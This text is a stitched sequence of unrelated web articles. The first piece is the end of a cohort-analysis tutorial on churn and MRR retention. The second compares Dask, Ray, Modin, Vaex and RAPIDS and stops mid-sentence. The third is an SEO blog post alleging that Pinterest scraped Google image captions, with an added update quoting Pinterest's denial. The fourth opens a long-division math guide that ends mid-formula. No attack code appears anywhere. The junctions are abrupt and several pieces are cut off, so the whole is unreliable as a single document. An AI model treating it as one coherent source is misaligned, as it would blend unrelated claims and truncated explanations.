<p>When looking at cohorts where percent is calculated relative to the previous month it is important to understand that higher percentages do not necessarily mean the highest number of lost customers. For example, losing 20 customers out of a 100 will result in a 20% churn with 20 customers lost, but losing 40 out of a 300 will result in a 13% churn with 40 customers lost. So the churn is lower but the number of lost customers is higher.</p>

<p>When presenting cohorts with percent calculation relative to the previous month it is always useful to pair it with cohorts showing pure numbers. So that a reader can easily understand what actual number a given percentage will convert.</p>

<h2 id="how-to-read-cohort-analysis">How to read cohort analysis</h2>

<p>You have to understand that the time on the cohort table is passing in two directions. From left to right – as each cohort progresses with its life. From top to the bottom – with each new cohort being added at the bottom.</p>

<p>This means two things:</p>
<ol><li>You would expect younger cohorts to perform better compared to the older once. As time passes, hopefully, you improve the service you provide. It becomes more mature. You sell to customers that are a better fit for your product.</li>
<li>You would expect a cohort to stabilize as more months pass. Hopefully, once customers have adopted your product they will stay with it for longer and will not churn at such a high rate as at the beginning of the lifecycle.</li></ol>

<p>Here is how we can apply this to churn cohorts:</p>

<p><img src="https://i.snap.as/9Xx3grt.png" alt=""></p>

<h2 id="using-cohort-analysis-to-understand-mrr-churn">Using cohort analysis to understand MRR churn</h2>

<p>You can use quite a few different metrics as a value for your cohort. MRR is a very good example. By calculating the MRR retention rate for each cohort you can easily understand not only where you lose the most of your money but also if you manage to grow revenue over the lifespan of the specific cohort.</p>

<p>Let’s take a look at the example below:</p>

<p><img src="https://i.snap.as/BHVoC8y.png" alt=""></p>

<p>You can see that in younger cohorts, specifically Feb 2020, Mar 2020, Apr 2020 our company managed to cover all MRR churn by expanding existing customers’ MRR. Thus achieving +100% MRR retention. These cohorts have more MRR in Month 2-4 than in Month 0. This is a great sign that you are doing something right and can expand your existing customer base.</p>

<h2 id="a-different-way-to-visualize-cohorts">A different way to visualize cohorts</h2>

<p>I want to describe one different way to visualize your cohort data. It gives you a good visual clue into the underlying patterns. The approach is to visualize your cohort as a multiple line chart.</p>

<p>Let’s take customer retention this time. We don’t really need to do any additional calculations here. It is the initial data we started our post with. From all customers that sign up in May 2019 how many left in June, and so on.</p>

<p>What we can do is instead of putting these data in the table, we can draw them as lines. The X-axis represents the lifecycle month of the cohort. The Y-axis represents the number of customers left in a given month of the lifecycle.</p>

<p>Here is the example of such visualization for our imaginary company:</p>

<p><img src="https://i.snap.as/ssFqV11.png" alt=""></p>

<p>When examining such visualization you want to look for three main things:</p>
<ol><li>Newer cohort lines should stay above the older cohort lines. That means that the new cohort has more customers and you are able to retain them better.</li>
<li>Hopefully, after the initial drop, the line will stabilize and go almost in parallel with the X-axes. It means that once customers adopt your product they stay with it and churn at a much lower rate than initially.</li>
<li>New lines should have a more shallow initial drop compared to the older ones. You can see on the example above how lines which are on top have much more shallow drops. This means that you are improving your service, and customers need less time to see its value.</li></ol>

<p>There are many different metrics you can use as a cohort value. We presented some of the most common ones.</p>

<p>I hope it was useful and if you have any questions or comments please feel free to reach out.</p>

Compared to competitors like Java, Python and Pandas make data exploration and transformation <strong>simple</strong>.</p><p>But both Python and Pandas are known to have issues around <strong>scalability</strong> and <strong>efficiency</strong>.</p><p>Python loses some efficiency right off the bat because it’s an interpreted, dynamically typed language. But more importantly, Python has always focused on simplicity and readability over raw power. Similarly, Pandas focuses on offering a simple, high-level API, largely ignoring performance. In fact, the creator of Pandas wrote “<a href="https://wesmckinney.com/blog/apache-arrow-pandas-internals/">The 10 things I hate about pandas</a>,” which summarizes these issues:</p><figure id="w-node-412b9aecdea3-e2612716"><p><img src="https://global-uploads.webflow.com/5d3ec351b1eba4332d213004/5ef62e9007b2509635bd1ba2_image3.png" alt="Ten things Wes McKinney hates about Pandas."></p><figcaption>Performance issues and lack of flexibility are the main things Pandas’ own creator doesn’t like about the library. (<a href="https://wesmckinney.com/blog/apache-arrow-pandas-internals/">source</a>)</figcaption></figure><p>So it’s no surprise that many developers are trying to add more power to Python and Pandas in various ways. Some of the most notable projects are:</p><ul role="list"><li><a href="https://www.datarevenue.com/ml-tools/dask"><strong>Dask</strong></a><strong>:</strong> a low-level scheduler and a high-level partial Pandas replacement, geared toward running code on compute clusters.</li><li><strong>Ray:</strong> a low-level framework for parallelizing Python code across processors or clusters.</li><li><a href="https://www.datarevenue.com/ml-tools/modin"><strong>Modin</strong></a><strong>:</strong> a drop-in replacement for Pandas, powered by either <strong>Dask</strong> or <strong>Ray</strong>.</li><li><a href="https://www.datarevenue.com/ml-tools/vaex"><strong>Vaex</strong></a><strong>:</strong> a partial Pandas replacement that uses lazy evaluation and memory mapping to allow developers to work with large datasets on standard machines.</li><li><a href="https://www.datarevenue.com/ml-tools/rapids"><strong>RAPIDS</strong></a><strong>: </strong>a collection of data-science libraries that run on GPUs and include <a href="https://github.com/rapidsai/cudf">cuDF</a>, a partial replacement for Pandas.</li></ul><p>There are others, too. Below is an overview of the Python data wrangling landscape:</p><figure id="w-node-78c43e6cecae-e2612716"><p><img src="https://global-uploads.webflow.com/5d3ec351b1eba4332d213004/5ef62eb85c7038610cea20d0_image2.png" alt="A graph showing how often popular data wrangling libraries are compared in Google searches."></p><figcaption>Dask, Modin, Vaex, Ray, and CuDF are often considered potential alternatives to each other. Source: Created with <a href="https://anvaka.github.io/vs/?query=Dask">this tool</a></figcaption></figure><p>So if you’re working with a lot of data and need faster results, which should you use?</p><h2><strong>Just tell me which one to try</strong></h2><p>Before you can make a decision about which tool to use, it’s good to have some more context about each of their approaches. We’ll compare each of them closely, but you’ll probably want to try them out in the following order:</p><ul role="list"><li><strong>Modin</strong>, with <strong>Ray</strong> as a backend. By installing these, you might see significant benefit by changing just a single line (`import pandas as pd` to `import modin.pandas as pd`). Unlike the other tools, Modin aims to reach full compatibility with Pandas.</li><li><strong>Dask</strong>,<strong> </strong>a larger and hence more complicated project. But Dask also provides <a href="https://docs.dask.org/en/latest/dataframe.html">Dask.dataframe</a>, a higher-level, Pandas-like library that can help you deal with <a href="https://en.wikipedia.org/wiki/External_memory_algorithm">out-of-core</a> datasets.</li><li><strong>Vaex, </strong>which is designed to help you work with large data on a standard laptop. Its Pandas replacement covers some of the Pandas API, but it’s more focused on exploration and visualization.</li><li><strong>RAPIDS, </strong>if you have access to NVIDIA graphics cards<strong>.</strong></li></ul><h2><strong>Quick comparison</strong></h2><p>Each of the libraries we examine has different strengths, weaknesses, and scaling strategies. The following table gives a broad overview of these. Of course, as with many things, most of the scores below are heavily dependent on your exact situation.&nbsp;</p><figure id="w-node-3fc1cb6579be-e2612716"><p><img src="https://global-uploads.webflow.com/5d3ec351b1eba4332d213004/5ef62ef85090a97b0c469fa9_image5.png" alt="A table comparing the tools across maturity, popularity, ease of adoption, and other metrics."></p><figcaption>Dask and Ray are more mature, but Modin and Vaex are easier to get started with. Rapids is useful if you have access to GPUs.</figcaption></figure><p>These are subjective grades, and they may vary widely given your specific circumstances. When assigning these grades, we considered:</p><ul role="list"><li><strong>Maturity: </strong>The time since the first commit and the number of commits.</li><li><strong>Popularity: </strong>The number of GitHub stars.</li><li><strong>Ease of Adoption: </strong>The amount of knowledge expected from users, presumed hardware resources, and ease of installation.</li><li><strong>Scaling ability: </strong>The broad dataset size limits for each tool, depending on whether it relies mainly on RAM, hard drive space on a single machine, or can scale up to clusters of machines.&nbsp;</li><li><strong>Use case: </strong>Whether the libraries are designed to speed up Python software in general (“<strong>General</strong>”), are focused on data science and machine learning (“<strong>Data science</strong>”), or are limited to simply replacing Pandas’ ‘DataFrame’ functionality (“<strong>DataFrame</strong>”).</li></ul><h2><strong>CPUs, GPUs, Clusters, or Algorithms?</strong></h2><p>If your dataset is too large to work with efficiently on a single machine, your main options are to run your code across…</p><ul role="list"><li><strong>...multiple threads or processors:</strong> Modern CPUs have several independent cores, and each core can run many threads. Ensuring that your program uses all the potential processing power by parallelizing across cores is often the easiest place to start.</li><li><strong>...GPU cores: </strong>Graphics cards were originally designed to efficiently carry out basic operations on millions of pixels in parallel. However, developers soon saw other uses for this power, and “GP-GPU” (general processing on a graphics processing unit) is now a popular way to speed up code that relies heavily on matrix manipulations.</li><li><strong>...compute clusters: </strong>Once you hit the limits of a single machine, you need a networked cluster of machines, working cooperatively.</li></ul><p>Apart from adding more hardware resources, clever algorithms can also improve efficiency. Tools like Vaex rely heavily on <a href="https://en.wikipedia.org/wiki/Lazy_evaluation"><strong>lazy evaluation</strong></a><strong> </strong>(not doing any computation until it’s certain the results are needed) and <a href="https://en.wikipedia.org/wiki/Memory-mapped_file"><strong>memory mapping</strong></a><strong> </strong>(treating files on hard drives as if they were loaded into RAM).</p><p>None of these strategies is inherently better than the others, and you should choose the one that suits your specific problem.</p><p>Parallel programming (no matter whether you’re using threads, CPU cores, GPUs, or clusters) offers many benefits, but it’s also quite complex, and it makes tasks such as debugging far more difficult.</p><p>Modern libraries can hide some – but not all – of this added complexity. No matter which tools you use, you’ll run the risk of expecting everything to work out neatly (below left), but getting chaos instead (below right).</p><figure id="w-node-7b8872b99c95-e2612716"><p><img src="https://global-uploads.webflow.com/5d3ec351b1eba4332d213004/5efef852495a4ce0972910e9_image4_s.jpg" alt="Puppies in a row eating food from different bowls – and then chaos ensues."></p><figcaption>Parallel processing doesn’t always work out as neatly as you expect. (<a href="https://www.reddit.com/r/aww/comments/2oagj8/multithreaded_programming_theory_and_practice/">Source</a>)</figcaption></figure><h2><strong>Dask vs. Ray vs. Modin vs. Vaex vs. RAPIDS</strong></h2><p>While not all of these libraries are direct alternatives to each other, it’s useful to compare them each head-to-head when deciding which one(s) to use for a project.</p><p>Before getting into the details, note that:</p><ul role="list"><li>RAPIDS is a collection of libraries. For this comparison, we consider only the <strong>cuDF</strong> component, which is the RAPIDS equivalent of Pandas.</li><li>Dask is better thought of as two projects: a low-level Python scheduler (similar in some ways to Ray) and a higher-level Dataframe module (similar in many ways to Pandas).</li></ul><h3><strong>Dask vs. Ray</strong></h3><p>Dask (as a lower-level scheduler) and Ray overlap quite a bit in their goal of making it easier to execute Python code in parallel across clusters of machines. Dask focuses more on the data science world, providing higher-level APIs that in turn provide partial replacements for Pandas, NumPy, and scikit-learn, in addition to a low-level scheduling and cluster management framework.</p><p>The creators of Dask and Ray discuss how the libraries compare in <a href="https://github.com/ray-project/ray/issues/642">this GitHub thread</a>, and they conclude that the scheduling strategy is one of the key differentiators. Dask uses a centralized scheduler to share work across multiple cores, while Ray uses distributed bottom-up scheduling.</p><h3><strong>Dask vs. Modin</strong></h3><p>Dask (the higher-level Dataframe) acknowledges the limitations of the Pandas API, and while it partially emulates this for familiarity, it doesn’t aim for full Pandas compatibility. If you have complicated existing Pandas code, it’s unlikely that you can simply switch out Pandas for Dask.Dataframe and have everything work as expected. By contrast, this is exactly the goal Modin is working toward: 100% coverage of Pandas. Modin can run on top of Dask but was originally built to work with Ray, and that integration remains more mature.</p><h3><strong>Dask vs. Vaex</strong></h3><p>Dask (Dataframe) is not fully compatible with Pandas, but it’s pretty close. These close ties mean that Dask also carries some of the baggage inherent to Pandas. Vaex deviates more from Pandas (although for basic operations, like reading data and computing summary statistics, it’s very similar) and therefore is also less constrained by it.</p><p>Ultimately, Dask is more focused on letting you scale your code to compute clusters, while Vaex makes it easier to work with large datasets on a single machine. Vaex also provides features to help you easily visualize and plot large datasets, while Dask focuses more on data processing and wrangling.</p><h3><strong>Dask vs. RAPIDS (cuDF)</strong></h3><p>Dask and RAPIDS play nicely together via an integration <a href="https://rapids.ai/dask.html">provided by</a> RAPIDS. If you have a compute cluster, you should use Dask. If you have an NVIDIA graphics card, you should use RAPIDS. If you have a compute cluster of NVIDIA GPUs, you should use both.</p><h3><strong>Ray vs. Modin or Vaex or RAPIDS</strong></h3><p>It’s not that meaningful to compare Ray to Modin, Vaex, or RAPIDS. Unlike the other libraries, Ray doesn’t offer high-level APIs or a Pandas equivalent. Instead, Ray powers Modin and <a href="https://docs.ray.io/en/latest/tune.html">integrates with RAPIDS</a> in a similar way to Dask.</p><h3><strong>Modin vs. Vaex</strong></h3><p>As with the Dask and Vaex comparison, Modin’s goal is to provide a full Pandas replacement, while Vaex deviates more from Pandas. Modin should be your first port of call if you’re looking for a quick way to speed up existing Pandas code, while Vaex is more likely to be interesting for new projects or specific use cases (especially visualizing large datasets on a single machine).</p><h3><strong>Modin vs. RAPIDS (cuDF)</strong></h3><p>Modin scales Pandas code by using many CPU cores, via Ray or Dask. RAPIDS scales Pandas code by running it on GPUs. If you have GPUs available, give RAPIDS a try. But the easiest win is likely to come from Modin, and you should probably turn to RAPIDS only after you’ve tried Modin first.</p><h3><strong>Vaex vs. RAPIDS (cuDF)</strong></h3><p>Vaex and RAPIDS are similar in that they can both provide performance boosts on a single machine: Vaex by better utilizing your computer’s hard drive and processor cores, and RAPIDS by using your computer’s GPU (if it’s available and compatible). The RAPIDS project as a whole aims to be much broader than Vaex, letting you do machine learning end-to-end without the data leaving your GPU. Vaex is better for prototyping and data exploration, letting you explore large datasets on consumer-grade machines.</p><h2><strong>Final remarks: Premature optimization is the root of all evil</strong></h2><p>It’s fun to play with new, specialized tools. That said, many …</p></div></div></div></div>

We do not, and never have, scraped Google search results at any time.” The original article suggested Pinterest scrapes Google directly, but instead it seems more likely that Pinterest grabs data from Google through it’s Chrome Extension. We’ll update this post as we learn more from them.</p></blockquote>
<p>A few weeks ago in the Twitterverse, @SwiftOnSecurity <a href="https://twitter.com/SwiftOnSecurity/status/1258875333446717445" target="_blank" rel="noopener noreferrer">outed Pinterest</a> for using a somewhat surprising SEO tactic: for every image uploaded to Pinterest that doesn’t have any real metadata or description of the picture, Pinterest automatically performs a reverse image search on Google, scrapes all of the metadata and descriptions they can find for that image, and then uploads that content onto their site and pretends it’s from their own users.</p>
<p>This is interesting for a couple of reasons:</p>
<ul>
<li dir="ltr" role="presentation"><span>Google typically does not react kindly to anyone trying to scrape its results </span><i><span>for any reason</span></i><span>, so this is incredibly difficult to do at scale (across hundreds of millions of photos) without being blocked.</span></li>
<li dir="ltr" role="presentation"><span>Often when somewhat shady SEO tactics are exposed on Twitter, Google responds by issuing a manual action and penalizing the offending site in search results. This famously happened to </span><a href="https://marketingland.com/10-big-brands-that-were-penalized-by-google-69646"><span>Genius years ago as they were put in time-out</span></a><span> and told to re-evaluate their blackhat SEO strategy. </span></li>
<li dir="ltr" role="presentation"><span>Pinterest is a publicly traded company, so if they’re penalized it could hurt the company’s stock price ($PINS).</span></li>
</ul>
<p><i><span>Content relevance</span></i><span>&nbsp;is a ranking factor in Google. The closer semantically you can describe a topic or image to how Google understands it, the better your chances of ranking higher in their index. Will Google find this behavior flagrantly blackhat and respond accordingly? </span></p>

<h2><strong>Some background on Pinterest SEO</strong></h2>
<p><span>Pinterest has been super successful with SEO growth over the years. Their post on </span><a href="https://medium.com/pinterest-engineering/demystifying-seo-with-experiments-a183b325cf4c"><span>Demystifying SEO with Experiments</span></a><span> was particularly inspirational for me in deciding to start </span><a href="https://www.rankscience.com/"><span>RankScience</span></a><span>, an SEO automation and A/B testing company. So any time I hear about programmatic SEO tactics that work on a site as large as Pinterest, with 800M+ pages indexed in Google, I’m intrigued. This is obviously a strategy they would never talk about doing publicly, so it’s fascinating to see it exposed and called out like this.</span></p>
<h2><strong>So how exactly does this Pinterest SEO growth hack work?</strong></h2>
<ul>
<li><span>User uploads a photo to Pinterest without any meta data.</span></li>
<li><span>Pinterest performs a reverse image search on Google for that image.</span></li>
<li><span>Pinterest scrapes all the text captions for related photos that appear from Google.</span></li>
<li><span>Pinterest publishes these text captions under </span><b>What others are saying</b><span> on their own page.</span></li>
<li></li>
</ul>

<p><img src="https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM.png" alt="Pinterest SEO growth hack" width="504" height="652" srcset="https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM.png 940w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-232x300.png 232w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-792x1024.png 792w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-768x993.png 768w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-600x776.png 600w" sizes="(max-width: 504px) 100vw, 504px"></p>

<p><span>Voila! Instant unique and scalable SEO text content that maps directly to Google’s understanding of the photo.&nbsp;</span><span>Google indexes the Pinterest page with the new text content and ranks it higher because of the strong relevance of the text on the page to its existing understanding of the photo.&nbsp;</span><span>Rinse and repeat across millions of photos.</span></p>
<h2><strong>The SEO community took notice:</strong></h2>
<h2><img src="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-300x120.png" alt="Pinterest SEO growth hack community reaction" width="478" height="191" srcset="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-300x120.png 300w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-1024x410.png 1024w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-768x307.png 768w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-600x240.png 600w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM.png 1334w" sizes="(max-width: 478px) 100vw, 478px"></h2>
<h2><strong>And what was Google’s response?</strong></h2>
<p><span>John Mu, Webmaster Trends Analyst at Google, and part of the webspam team responsible for policing SEO behavior, chimed in on the thread and offered support for the content available on Pinterest. He didn’t comment directly on this behavior, but I’d bet that the popularity of this thread alerted some people at Google and that there’s an investigation going on internally into this practice at Pinterest. ($PINS) The only reason that Google would let this slide is that they don’t view policing Image Search as high priority.</span></p>
<h2><b>How you can take advantage of Content Relevance to rank higher in Google</b></h2>
<p><span>Content relevance is an important ranking factor in Google search. It’s widely accepted that Google calculates relevance for individual URLs and pieces of content as they relate to a particular query or keyword, and that these quantitative relevance calculations play a role in its ranking algorithms. In the Pinterest example, they’re taking an image that Google already knows about and grabbing multiple text descriptions of that image from Google itself, then combining them in one place to provide one comprehensive page describing the image. This maps exactly to Google’s existing understanding of that image, so the page then likely achieves a very high content relevance score.</span></p>
<p><span>One way you can apply what Pinterest is doing to improve the rankings of content on your own site is to use a NLP method called </span><a href="https://en.wikipedia.org/wiki/Tf%E2%80%93idf"><span>TF-IDF</span></a><span> (term frequency-inverse document frequency). This is a text analysis technique that helps reveal how important a word or phrase is to a document in a corpus (example: a collection of URLs). You can either break out a spreadsheet and do this by hand, or use an advanced content optimization tool like <a href="https://www.rankscience.com/seo-content-insights">RS Content Insights</a> to do this analysis at scale.&nbsp; </span></p>
<p><span>Let’s say that you wanted to rank in Google for </span><i><span>google image search seo</span></i><span>. We already know which documents Google thinks are the most relevant and highest authority for this search term because those are the pages that show up in search results. So we can start by downloading the top 25 URLs ranking in Google for </span><i><span>google image search seo</span></i><span> and performing tf–idf analysis across all of those documents to reveal key topic entities that are semantically related to the search term.</span></p>
<p><span>Here are the topic entities produced by TF-IDF when we ran this post that you’re reading right now through Content Insights for </span><i><span>google image search seo</span></i><span>.</span></p>
<p><img src="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-946x1024.png" alt="google image search seo" width="640" height="693" srcset="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-946x1024.png 946w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-277x300.png 277w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-768x831.png 768w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-600x649.png 600w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM.png 1388w" sizes="(max-width: 640px) 100vw, 640px"></p>
<p><span>You’ll see that TF-IDF analysis suggests using keywords like alt tags, alt text, image quality, file size, and stock photos, which are all associated with </span><i><span>google image search seo</span></i><span>, even though they are not replacements or alternatives to the keyword. This gets directly at Google’s understanding of the topic and using this method you can get your content ranking your post higher for having a better content relevance score — it’s often surprisingly effective. In addition to </span><a href="https://www.rankscience.com/coderwall-seo-split-test"><span>SEO A/B testing</span></a><span>, which everyone should be doing by now, using NLP and TF-IDF to refresh and update existing long-form content on your site is an incredibly effective way to grow search traffic and rankings in 2020, and an important tool in any marketing team’s tool kit.</span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In mathematics, long division is a powerful procedure through which division can be carried out with pencil and paper. As powerful as it is, it is generally taught at the pre-college level without much consideration on its<strong> underlying theory</strong> or its <strong>alternatives</strong>…</p><p>In this guide though, we’ll take a look at both of those, and delve into the different types of <strong>division procedures</strong> under the different scenarios. We’ll also try to illustrate their role in promoting a holistic understanding about division and numbers in general — through candid analysis and a wide range of examples.</p><div><figure><img src="https://mathvault.ca/wp-content/uploads/Long-Division-Guide-for-Integers-Logo.png" alt="Definitive Higher Math Guide on Long Division for Integers — Logo" width="850" height="283" title="Long Division Guide for Integers Logo" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20850%20283'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/Long-Division-Guide-for-Integers-Logo.png"></figure></div><p>(By the way, are you fairly acquainted with the content of this guide? If so, you might find this comprehensive <strong>summary worksheet</strong> both challenging and useful.)</p> <p><span><a href="#" target="_self"><span><strong>Download the 11-Page Summary Worksheet for this Guide</strong></span></a></span></p><h2 id="terms"><span id="Euclidean_Division_%E2%80%94_Terminology"></span><a href="#toc">Euclidean Division — Terminology</a><span></span></h2><p> In arithmetic, we often like to express a number $n$ as chunks of another (non-zero) number $d$. When that happens, we’re said to be dividing $n$ by $d$, where $n$ is known as the <strong>dividend</strong>, and $d$ the<strong> divisor.</strong></p><p> In general, given a dividend $n$ and a divisor $d$, we can express $n$ as $dq + r$ for some <em>integer</em> $q$ and some number $r$, and while $n$ can have many <strong>$dq+r$ representations</strong>, there is only one such representation where $ 0\le r &lt; |d|$.</p><p>In particular, in the case where the dividend and the divisor are <em>integers</em>, this result is known as the <strong><a rel="noreferrer noopener" aria-label="Division Theorem (opens in a new tab)" href="https://en.wikipedia.org/wiki/Euclidean_division#Statement_of_the_theorem" target="_blank">Division Theorem</a></strong>, but even if they are not, the following still apply in general:</p><ul><li>$q$ — which is the unique <em>integer</em> in the above $dq+r$ representation — is known as the <strong>quotient</strong>.</li><li>$r$ — which is the unique number in the above $dq+r$ representation — is known as the <strong>remainder</strong>.</li><li>The act of finding those two numbers is called an <strong>Euclidean division</strong>, or more colloquially, <em>division with remainder</em>.</li></ul><div id=""><p>In Case You're Wondering...</p><p> The Division Theorem for integers is generally established by relying on the <strong>Well-Ordering Principle</strong>. For the general case, the <strong><a rel="noreferrer noopener" href="https://proofwiki.org/wiki/Archimedean_Principle" target="_blank">Archimedean Property for real numbers</a> </strong>might be of help.</p></div><p> So what’s being implied here is that the dividend and the divisor are generally fixed numbers, while the <strong>interim quotients</strong>/<strong>remainders</strong> can change depending on the stage of the division we’re in. Furthermore:</p><ul><li>The equation $n=dq+r$ is known as the <strong>algebraic representation</strong> of the division.</li><li> The equation $\displaystyle \frac{n}{d} = q + \frac{r}{d}$ is known as the <strong>fractional representation</strong> of the division.</li></ul><p>(to be sure, there’s also the <strong>mixed fraction</strong> $\displaystyle q \, \frac{r}{d}$, though such notations are generally more prone to confusion when we move beyond the integers.)</p><p> And of course, there’s also the <strong>graphical representations</strong> of the division as well — which we’ll get into after some preliminary theory on division procedure.</p><h2 id="edptheory"><span id="Euclidean_Division_Procedure_%E2%80%94_Theory"></span><a href="#toc">Euclidean Division Procedure — Theory</a><span></span></h2><p> Of course, the Division Theorem is a neat piece of logic guaranteeing that in an Euclidean division scenario, the <strong>quotient</strong> and the <strong>remainder </strong>exist and are unique. However, it doesn’t offer us much clue as to how we should go about finding those numbers in practice…</p><p> But then, that’s precisely where the primary topic of our interest — <strong>Euclidean division procedure </strong> — comes into play.</p><p> In a nutshell, these are the finite, recursive procedures that seek to find the quotient and the remainder through <strong>iterated subtractions</strong>. They tend to operate by deducting the dividend repeatedly — usually in a series of <em>leaps</em> — until it becomes smaller than the divisor itself.</p><p>And when that happens, the process comes to an end — with the <strong>last interim quotient </strong>and <strong>remainder</strong> being the answers to the original Euclidean division.</p><p>Or more specifically:</p><ol><li>Given a dividend $n$ and a (non-zero) divisor $d$, we would begin the procedure by <strong>deducting</strong> $n$ (or its absolute value) by $d$ — an integer number of times (say $q_1$). This would lead to an interim remainder $r_1$, and the following interim algebraic representation of the division: \[ <br>n = d q_1 + r_1 \]</li><li> At this point, if $0 \le r_1 &lt; |d|$, then the division procedure is finished. If not, we would continue with the <strong>same process</strong> by deducting $r_1$ (or its absolute value) by $d$ — another integer number of times (say $q_2$). This would lead to the next interim remainder $r_2$, and the next algebraic representation of the division: \[ n = d q_1 + d q_2 + r_2 \]</li><li> So as we go through the <strong>$i^{\text{th}}$ iteration</strong> of the division, we would obtain:<ul><li> The <strong>$i^{\text{th}}$-stage quotient </strong>$q_i$</li><li> The <strong>interim quotient</strong> $q_1 + \cdots + q_i$</li><li> The <strong>interim remainder</strong> $r_i$</li></ul></li><li> And if we choose the stage quotients judiciously so that the $|r_i|$ decreases by, say, at least $1$ at each stage, then after a <em>finite</em> number of iterations (say $m$), we’d be guaranteed to generate an <strong>interim remainder</strong> $r_m$ such that $0 \le r_m &lt; |d|$. And when that happens, our final algebraic representation would become: \begin{align*} <br>n &amp; = dq_1 + \cdots + dq_m + r_m \\ &amp; = d (q_1 + \cdots +q_m) + r_m \end{align*} At which point, the division procedure would come to an end, yielding $q_1 + \cdots + q_m$ and $r_m$ as the <strong>quotient</strong> and the <strong>remainder</strong> of $n \div d$, respectively.</li></ol><p>Here, notice that whether $n$ and $d$ are integers or not, the interim quotients must be always kept as <strong>integers</strong> — and are the only ones among the $n$, $d$, $q$s, $r$s that must satisfy that requirement.</p><p>For this guide though, we’ll restrict ourselves to the cases where both $n$ and $d$ are integers, and look at the division methods and approaches that come out of those. These include the <strong>long/short division methods</strong>, the <strong> chunking methods,</strong> the <strong>freeform method </strong>— among other less graphical division approaches.</p><h2><span id="Integer_Division"></span><a href="#toc">Integer Division</a><span></span></h2><p>Since the concept of division has its basis on the natural numbers, it makes sense that we first start from there and illustrate some of the <strong>primary methods</strong> being involved. Once there, we’ll slowly expand our toolset with other alternate methods and approaches — so that other scenarios of integer divisions can be included as well.</p><h3><span id="Case_1_%E2%80%94_DigitBased_Methods"></span><a href="#toc">Case 1 — Digit-Based Methods</a><span></span></h3><p> If you have a tape that’s<strong> 1529 cm</strong> long and you want to cut it down into pieces of <strong>7cm chunks</strong>, how many of those pieces can you make? And after all is said and done, how much of the tape would remain?</p><p> Well, as you might guess, this is nothing more than the following <strong>division problem</strong>: \[ 7 \enclose{longdiv}{1529} \] which can be solved by using the traditional <strong><a rel="noreferrer noopener" aria-label="long division method (opens in a new tab)" href="https://en.wikipedia.org/wiki/Long_division" target="_blank">long division method</a></strong>, or — if we prefer — the abbreviated <strong>short division method</strong> as well.</p><h4><span id="Long_Division"></span><a href="#toc">Long Division</a><span></span></h4><p>As you might already know, the long division procedure consists in setting up the division tableaus so that at each stage, we would be cranking out a digit of the <strong>quotient</strong> — by deducting the dividend/interim remainder by the largest number of times possible.</p><p>In this case for example, since $1529$ can be deducted by $7$ $100$ times, but not $1000$ times, we know that we should begin the process by looking into the <strong>digit-multiples</strong> of $100$.</p><p>In fact, a bit of inspection would show that $1529$ can be deducted by $7$ $200$ times, but not $300$ times. This would lead us to choose $200$ as our first <strong>stage quotient</strong>, which would in turn produce the following tableau: \begin{array}{r} 200 \\[-0.35em] 7 \enclose{longdiv}{1529}\kern{-0.15ex} <br>\\[-0.3em] \underline{1400} <br>\\[-0.25em] 129 \end{array} And here is the beauty about this approach: since we’ve already established that $1529$ can be deducted by $7$ $200$ times, but not $300$ times, this means that we definitely won’t be further deducting $1529$ by $100$ times or more, and that all that remains is to focus at the <strong>digit-multiples</strong> of $10$ instead.</p><p>In fact, a little bit of inspection would show that $129$ — what remains now of $1529$ — can be deducted by $7$ $10$ times, but not $20$ times. This would lead us to choose $10$ as the next <strong>stage quotient</strong>, which in turn would lead to the following tableau: \begin{array}{r} 10 \\[-0.35em] 200 \\[-0.35em] 7 \enclose{longdiv}{1529}\kern{-0.15ex} <br>\\[-0.3em] \underline{1400} <br>\\[-0.25em] 129 \\[-0.3em] \underline{\phantom{1}70} <br>\\[-0.25em] 59 \end{array} As you can see here, our notation is a bit unusual in that the numbers are being stacked up at the <strong>extremes</strong>, but those are there for a few reasons — which will become clearer in the next few sections.</p><p>But that aside, notice that since we’ve already established that what remained of $1529$ could be deducted by $7$ $10$ times, but not $20$ times, this means that we’ll definitely not be further deducting it by $10$ times or more — and that a deduction by a <strong>digit-multiple</strong> of $1$ should be our next step.</p><p>In fact, it doesn’t take a long time to realize that $59$ — what remains now of $1529$ — can be deducted by $7$ $8$ times, but not $9$ times. This would lead us to choose $8$ as our next <strong>stage quotient</strong>, which in turn would lead us to our next tableau: <br>\begin{array}{r} 8 \\[-0.35em] 10 \\[-0.35em] 200 \\[-0.35em] 7 \enclose{longdiv}{1529}\kern{-0.15ex} <br>\\[-0.3em] \underline{1400} <br>\\[-0.25em] 129 \\[-0.3em] \underline{\phantom{1}70} <br>\\[-0.25em] 59 \\[-0.3em] \underline{56} \\[-0.25em] 